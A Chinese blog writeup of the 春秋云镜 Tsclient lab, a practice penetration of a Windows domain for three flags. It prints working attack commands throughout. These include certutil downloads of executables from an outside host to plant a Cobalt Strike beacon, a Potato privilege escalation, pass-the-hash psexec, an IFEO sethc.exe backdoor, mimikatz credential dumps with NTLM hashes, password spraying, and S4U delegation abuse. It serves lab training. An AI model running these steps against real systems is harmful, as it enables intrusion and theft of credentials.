---
title: "春秋云镜 Tsclient Writeup"
date: 2023-07-30T18:41:02+08:00
lastmod: 2023-07-30T18:41:02+08:00
draft: false
author: "X1r0z"

tags: ['windows', 'mssql', 'domain', 'rdp']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

春秋云镜 Tsclient Writeup

<!--more-->

## flag01

fscan

```
$ fscan ./fscan_darwin_arm64 -h 39.99.141.107

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 39.99.141.107   is alive
[*] Icmp alive hosts len is: 1
39.99.141.107:1433 open
39.99.141.107:139 open
39.99.141.107:135 open
39.99.141.107:80 open
[*] alive ports len is: 4
start vulscan
[*] WebTitle: http://39.99.141.107      code:200 len:703    title:IIS Windows Server
[*] NetInfo:
[*]39.99.141.107
   [->]WIN-WEB
   [->]172.22.8.18
   [->]2001:0:348b:fb58:4f2:1ea1:d89c:7294
[+] mssql:39.99.141.107:1433:sa 1qaz!QAZ
已完成 4/4
[*] 扫描结束,耗时: 19.03864925s
```

mssql 弱口令, 直接上 MDUT

![image-20230730150556671](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307301505710.png)

ipconfig

```
Windows IP 配置

以太网适配器 以太网 2:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::95df:a060:ade9:6939%8
   IPv4 地址 . . . . . . . . . . . . : 172.22.8.18
   子网掩码  . . . . . . . . . . . . : 255.255.0.0
   默认网关. . . . . . . . . . . . . : 172.22.255.253

隧道适配器 Teredo Tunneling Pseudo-Interface:

   连接特定的 DNS 后缀 . . . . . . . : 
   IPv6 地址 . . . . . . . . . . . . : 2001:0:348b:fb58:4f2:1ea1:d89c:7294
   本地链接 IPv6 地址. . . . . . . . : fe80::4f2:1ea1:d89c:7294%12
   默认网关. . . . . . . . . . . . . : ::

隧道适配器 isatap.{7901C223-3BC4-42B0-BD21-258AA6858209}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
   连接特定的 DNS 后缀 . . . . . . . : 
```

systeminfo

```
主机名:           WIN-WEB
OS 名称:          Microsoft Windows Server 2016 Datacenter
OS 版本:          10.0.14393 暂缺 Build 14393
OS 制造商:        Microsoft Corporation
OS 配置:          独立服务器
OS 构件类型:      Multiprocessor Free
注册的所有人:     
注册的组织:       Aliyun
产品 ID:          00376-40000-00000-AA947
初始安装日期:     2022/7/11, 12:46:14
系统启动时间:     2023/7/30, 15:02:31
系统制造商:       Alibaba Cloud
系统型号:         Alibaba Cloud ECS
系统类型:         x64-based PC
处理器:           安装了 1 个处理器。
                  [01]: Intel64 Family 6 Model 85 Stepping 4 GenuineIntel ~2500 Mhz
BIOS 版本:        SeaBIOS 449e491, 2014/4/1
Windows 目录:     C:\Windows
系统目录:         C:\Windows\system32
启动设备:         \Device\HarddiskVolume1
系统区域设置:     zh-cn;中文(中国)
输入法区域设置:   zh-cn;中文(中国)
时区:             (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐
物理内存总量:     4,095 MB
可用的物理内存:   1,918 MB
虚拟内存: 最大值: 4,799 MB
虚拟内存: 可用:   1,574 MB
虚拟内存: 使用中: 3,225 MB
页面文件位置:     C:\pagefile.sys
域:               WORKGROUP
登录服务器:       暂缺
修补程序:         安装了 6 个修补程序。
                  [01]: KB5013625
                  [02]: KB4049065
                  [03]: KB4486129
                  [04]: KB4486131
                  [05]: KB5014026
                  [06]: KB5013952
网卡:             安装了 1 个 NIC。
                  [01]: Red Hat VirtIO Ethernet Adapter
                      连接名:      以太网 2
                      启用 DHCP:   是
                      DHCP 服务器: 172.22.255.253
                      IP 地址
                        [01]: 172.22.8.18
                        [02]: fe80::95df:a060:ade9:6939
Hyper-V 要求:     已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。
```

whoami /priv

```
特权信息
----------------------

特权名                        描述                 状态  
============================= ==================== ======
SeAssignPrimaryTokenPrivilege 替换一个进程级令牌   已禁用
SeIncreaseQuotaPrivilege      为进程调整内存配额   已禁用
SeChangeNotifyPrivilege       绕过遍历检查         已启用
SeImpersonatePrivilege        身份验证后模拟客户端 已启用
SeCreateGlobalPrivilege       创建全局对象         已启用
SeIncreaseWorkingSetPrivilege 增加进程工作集       已禁用
```

因为是 mssql 服务账户, 考虑 Potato 系列提权

这里被坑了一把, 一开始用的 Pipe Potato 反弹 cs 上线, 结果 hashdump, mimikatz 一直拒绝访问

最后换成了 SweetPotato, 索性把各种 exe 都下载下来直接在 MDUT 里面运行

```shell
certutil -urlcache -split -f http://1.117.70.230:65221/a.exe C:\windows\temp\a.exe
certutil -urlcache -split -f http://1.117.70.230:65221/SweetPotato.exe C:\windows\temp\SweetPotato.exe
```

![image-20230730160340116](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307301603155.png)

通过 SweetPotato 上线 cs

![image-20230730160859932](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307301608966.png)

flag01 在 Administrator 家目录下

```
 _________  ________  ________  ___       ___  _______   ________   _________   
|\___   ___\\   ____\|\   ____\|\  \     |\  \|\  ___ \ |\   ___  \|\___   ___\ 
\|___ \  \_\ \  \___|\ \  \___|\ \  \    \ \  \ \   __/|\ \  \\ \  \|___ \  \_| 
     \ \  \ \ \_____  \ \  \    \ \  \    \ \  \ \  \_|/_\ \  \\ \  \   \ \  \  
      \ \  \ \|____|\  \ \  \____\ \  \____\ \  \ \  \_|\ \ \  \\ \  \   \ \  \ 
       \ \__\  ____\_\  \ \_______\ \_______\ \__\ \_______\ \__\\ \__\   \ \__\
        \|__| |\_________\|_______|\|_______|\|__|\|_______|\|__| \|__|    \|__|
              \|_________|                                                      


Getting flag01 is easy, right?

flag01: flag{REDACTED}


Maybe you should focus on user sessions...
```

## flag02

fscan 扫内网

```shell
beacon> shell C:\windows\temp\fscan.exe -h 172.22.8.0/24
[*] Tasked beacon to run: C:\windows\temp\fscan.exe -h 172.22.8.0/24
[+] host called home, sent: 73 bytes
[+] received output:

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.8.15     is alive
(icmp) Target 172.22.8.18     is alive
(icmp) Target 172.22.8.46     is alive
(icmp) Target 172.22.8.31     is alive
[*] Icmp alive hosts len is: 4
172.22.8.31:445 open
172.22.8.46:445 open
172.22.8.15:445 open
172.22.8.18:445 open
172.22.8.31:139 open
172.22.8.46:139 open
172.22.8.15:139 open
172.22.8.18:139 open
172.22.8.31:135 open
172.22.8.46:135 open
172.22.8.18:135 open
172.22.8.15:135 open
172.22.8.46:80 open
172.22.8.18:80 open
172.22.8.18:1433 open
172.22.8.15:88 open
[*] alive ports len is: 16
start vulscan
[*] NetInfo:
[*]172.22.8.18
   [->]WIN-WEB
   [->]172.22.8.18
   [->]2001:0:348b:fb58:1092:159f:d89d:8798
[*] NetInfo:
[*]172.22.8.46
   [->]WIN2016
   [->]172.22.8.46
[*] NetInfo:
[*]172.22.8.31
   [->]WIN19-CLIENT
   [->]172.22.8.31
[*] NetInfo:
[*]172.22.8.15
   [->]DC01
   [->]172.22.8.15
[*] NetBios: 172.22.8.15     [+]DC XIAORANG\DC01            
[*] NetBios: 172.22.8.31     XIAORANG\WIN19-CLIENT          
[*] NetBios: 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393 
[*] WebTitle: http://172.22.8.18        code:200 len:703    title:IIS Windows Server
[*] WebTitle: http://172.22.8.46        code:200 len:703    title:IIS Windows Server
[+] mssql:172.22.8.18:1433:sa 1qaz!QAZ
```

RDP

```shell
172.22.8.15:3389 open
172.22.8.31:3389 open
172.22.8.46:3389 open
172.22.8.18:3389 open
```

NetBIOS

```shell
172.22.8.15 XIAORANG\DC01 # 域控
172.22.8.31 XIAORANG\WIN19-CLIENT
172.22.8.46 WIN2016.xiaorang.lab
172.22.8.18 WIN-WEB # 本机
```

根据上文的提示, 直接创建一个管理员账号连接过去查看用户会话

![image-20230730161210496](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307301612535.png)

![image-20230730161334047](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307301613086.png)

netstat 查看连接信息, 发现是从内网 `172.22.8.31 XIAORANG\WIN19-CLIENT` 上连过来的

![image-20230730162720676](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307301627738.png)

根据题目 tsclient, 参考文章如下

[https://mp.weixin.qq.com/s/Aog7M_6XauRi96wFeRo6sg](https://mp.weixin.qq.com/s/Aog7M_6XauRi96wFeRo6sg)

[https://www.geekby.site/2021/01/红蓝对抗中rdp协议的利用](https://www.geekby.site/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/)

[https://www.c0bra.xyz/2021/01/11/RDP反向攻击](https://www.c0bra.xyz/2021/01/11/RDP%E5%8F%8D%E5%90%91%E6%94%BB%E5%87%BB/)

得知需要模拟 John 用户的令牌, 并访问 `\\tsclient`共享 (172.22.8.31)

这里也被坑了好长时间, 无论使用 cs 自带的 make token 还是 msf 的 incognito, 还是 SharpToken, 执行 `dir \\tsclient\c` 都显示拒绝访问, 很怪

无奈翻了下网上的 Writeup, 提示需要 psexec 连过去再用 msf 上线, 之后再用 incognito 就能成功模拟令牌了

```shell
proxychains psexec.py -hashes :2caf35bb4c5059a3d50599844e2b9b1f administrator@172.22.8.18
```

![image-20230730170037549](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307301700602.png)

![image-20230730170100304](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307301701350.png)

credential.txt

```
xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#

Do you know how to hijack Image?
```

一眼 IFEO 劫持

域用户 RDP 连过去提示密码已过期

![image-20230730171849407](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307301718470.png)

修改密码后再次登录 `172.22.8.31` 提示登录失败, 因为不在 Remote Desktop Users 用户组内

![image-20230730171953938](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307301719007.png)

172.22.8.46 登录成功

![image-20230730172942169](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307301729236.png)

但只有普通用户权限, 需要提权

根据上文的提示, 猜测能够直接修改注册表进行 IFEO 劫持

```shell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe"
```

开始菜单锁定用户, 然后连按五次 shift

![image-20230730174036811](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307301740869.png)

flag02 在 Administrator 家目录下

![image-20230730174159621](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307301741677.png)

## flag03

logonpasswords

```shell
beacon> logonpasswords
[*] Tasked beacon to run Mimikatz inject pid:1928
[*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command into 1928 (x64)
[+] host called home, sent: 297602 bytes
[+] received output:

Authentication Id : 0 ; 15467382 (00000000:00ec0376)
Session           : RemoteInteractive from 2
User Name         : Aldrich
Domain            : XIAORANG
Logon Server      : DC01
Logon Time        : 2023/7/30 17:28:43
SID               : S-1-5-21-3289074908-3315245560-3429321632-1105
	msv :	
	 [00000003] Primary
	 * Username : Aldrich
	 * Domain   : XIAORANG
	 * NTLM     : e19ccf75ee54e06b06a5907af13cef42
	 * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63
	 * DPAPI    : a3f0e6622289e7951e9a12b27368cda5
	tspkg :	
	wdigest :	
	 * Username : Aldrich
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : Aldrich
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 52967 (00000000:0000cee7)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/7/30 16:21:58
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * NTLM     : 4ba974f170ab0fe1a8a1eb0ed8f6fe1a
	 * SHA1     : e06238ecefc14d675f762b08a456770dc000f763
	tspkg :	
	wdigest :	
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : WIN2016$
	 * Domain   : xiaorang.lab
	 * Password : ...... (略)
	ssp :	
	credman :	

Authentication Id : 0 ; 52935 (00000000:0000cec7)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/7/30 16:21:58
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * NTLM     : 02b2a436556a3dd5d6638ad03f87c43e
	 * SHA1     : c81ff31553d1e42093c29c46ed26bdca3257cc40
	tspkg :	
	wdigest :	
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : WIN2016$
	 * Domain   : xiaorang.lab
	 * Password : ...... (略)
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WIN2016$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2023/7/30 16:21:58
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * NTLM     : 02b2a436556a3dd5d6638ad03f87c43e
	 * SHA1     : c81ff31553d1e42093c29c46ed26bdca3257cc40
	tspkg :	
	wdigest :	
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : win2016$
	 * Domain   : XIAORANG.LAB
	 * Password : ...... (略)
	ssp :	
	credman :	

Authentication Id : 0 ; 23516 (00000000:00005bdc)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2023/7/30 16:21:58
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * NTLM     : 02b2a436556a3dd5d6638ad03f87c43e
	 * SHA1     : c81ff31553d1e42093c29c46ed26bdca3257cc40
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 15442286 (00000000:00eba16e)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/7/30 17:28:42
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Primary
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * NTLM     : 02b2a436556a3dd5d6638ad03f87c43e
	 * SHA1     : c81ff31553d1e42093c29c46ed26bdca3257cc40
	tspkg :	
	wdigest :	
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : WIN2016$
	 * Domain   : xiaorang.lab
	 * Password : ...... (略)
	ssp :	
	credman :	

Authentication Id : 0 ; 15442262 (00000000:00eba156)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/7/30 17:28:42
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Primary
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * NTLM     : 02b2a436556a3dd5d6638ad03f87c43e
	 * SHA1     : c81ff31553d1e42093c29c46ed26bdca3257cc40
	tspkg :	
	wdigest :	
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : WIN2016$
	 * Domain   : xiaorang.lab
	 * Password : ...... (略)
	ssp :	
	credman :	

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2023/7/30 16:22:01
SID               : S-1-5-17
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2023/7/30 16:21:59
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WIN2016$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2023/7/30 16:21:58
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : win2016$
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :	
	credman :	
```

crackmapexec

```shell
$ proxychains crackmapexec smb -u Aldrich -p 'P@ssw0rd' -d xiaorang.lab 172.22.8.0/24
[proxychains] config file found: /usr/local/etc/proxychains.conf
[proxychains] preloading /usr/local/lib/libproxychains4.dylib
[proxychains] DLL init: proxychains-ng 4.16-git-13-g133e06b
SMB         172.22.8.46     445    WIN2016          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
SMB         172.22.8.18     445    WIN-WEB          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
SMB         172.22.8.15     445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)
SMB         172.22.8.31     445    WIN19-CLIENT     [*] Windows 10.0 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)
SMB         172.22.8.46     445    WIN2016          [+] xiaorang.lab\Aldrich:P@ssw0rd
SMB         172.22.8.18     445    WIN-WEB          [-] xiaorang.lab\Aldrich:P@ssw0rd STATUS_LOGON_FAILURE
SMB         172.22.8.15     445    DC01             [+] xiaorang.lab\Aldrich:P@ssw0rd
SMB         172.22.8.31     445    WIN19-CLIENT     [+] xiaorang.lab\Aldrich:P@ssw0rd
```

查询域委派关系

```shell
$ proxychains findDelegation.py xiaorang.lab/Aldrich:'P@ssw0rd' -dc-ip 172.22.8.15 -target-domain xiaorang.lab

Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

AccountName    AccountType  DelegationType                      DelegationRightsTo
-------------  -----------  ----------------------------------  --------------------------------------------------
WIN2016$       Computer     Constrained w/ Protocol Transition  ldap/DC01.xiaorang.lab/xiaorang.lab
WIN2016$       Computer     Constrained w/ Protocol Transition  ldap/DC01.xiaorang.lab
WIN2016$       Computer     Constrained w/ Protocol Transition  ldap/DC01
WIN2016$       Computer     Constrained w/ Protocol Transition  ldap/DC01.xiaorang.lab/XIAORANG
WIN2016$       Computer     Constrained w/ Protocol Transition  ldap/DC01/XIAORANG
WIN2016$       Computer     Constrained w/ Protocol Transition  ldap/DC01.xiaorang.lab/DomainDnsZones.xiaorang.lab
WIN2016$       Computer     Constrained w/ Protocol Transition  ldap/DC01.xiaorang.lab/ForestDnsZones.xiaorang.lab
WIN19-CLIENT$  Computer     Constrained w/ Protocol Transition  cifs/WIN2016.xiaorang.lab
WIN19-CLIENT$  Computer     Constrained w/ Protocol Transition  cifs/WIN2016
```

存在从 `WIN2016$` 到 `DC01` 的约束委派, 并且委派的是 LDAP 服务

利用 S4U 协议请求 ST 伪造 Administrator 用户

```shell
proxychains getST.py xiaorang.lab/WIN2016\$ -hashes :02b2a436556a3dd5d6638ad03f87c43e -dc-ip 172.22.8.15 -spn ldap/DC01.xiaorang.lab -impersonate administrator
```

*本来的思路是想利用票据进行 DCSync 导出域管 Hash 之后再去 psexec 的 (因为委派的是 LDAP 服务), 不过写 Writeup 的时候发现直接 psexec 或者 wmiexec 过去好像也行...*

![image-20230730175613824](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307301756896.png)

flag03 在 Administrator 家目录下

![image-20230730175952312](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202307301759378.png)

## 后记

中间重置了好几次靶机 (

打完后才发现 `WIN2016$` 在 `Domain Admins` 组内, 所以直接 DCSync 也行

查看域委派关系可以发现存在从 `WIN19-CLIENT` 到 `WIN2016` 的约束委派, 猜测或许也能通过 RDP 反打或者其它方式拿到 `WIN19-CLIENT` 的权限, 然后再通过委派拿到 `WIN2016` 的权限?